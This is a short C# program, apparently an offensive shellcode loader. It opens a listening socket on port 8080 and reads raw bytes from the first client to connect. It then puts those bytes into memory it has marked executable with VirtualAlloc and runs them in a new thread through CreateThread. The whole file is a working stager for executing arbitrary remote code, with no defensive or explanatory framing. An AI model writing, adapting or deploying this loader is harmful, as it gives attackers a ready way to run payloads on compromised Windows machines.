using System.Runtime.InteropServices;
using System;
using System.Net.Sockets;
using System.Net;
class Program
{
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(UInt32 lpAddress, UInt32 dWsize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dWsize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThradId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliSeconds);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    static void Main(string[] args)
    {
        // Socket creation
        IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
        IPAddress ipAddress = ipHost.AddressList[1];
        IPEndPoint localEndpoint = new IPEndPoint(ipAddress, 8080);

        Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        s.Bind(localEndpoint);
        s.Listen(5);

        // Accept incomming connection
        Socket handler = s.Accept();
        byte[] bytes = new byte[1024];
        byte[] shellcode;

        //Save the incomming bytes to a byte array to execute
        while (true)
        {
            int bytesRec = handler.Receive(bytes);
            shellcode = new byte[bytesRec];
            Buffer.BlockCopy(bytes, 0, shellcode, 0, bytesRec);
            break;
        }

        IntPtr address = VirtualAlloc(0, (UInt32)(shellcode.Length - 1), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, address, shellcode.Length - 1);
        IntPtr threadHandle = CreateThread(0, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
    }
}

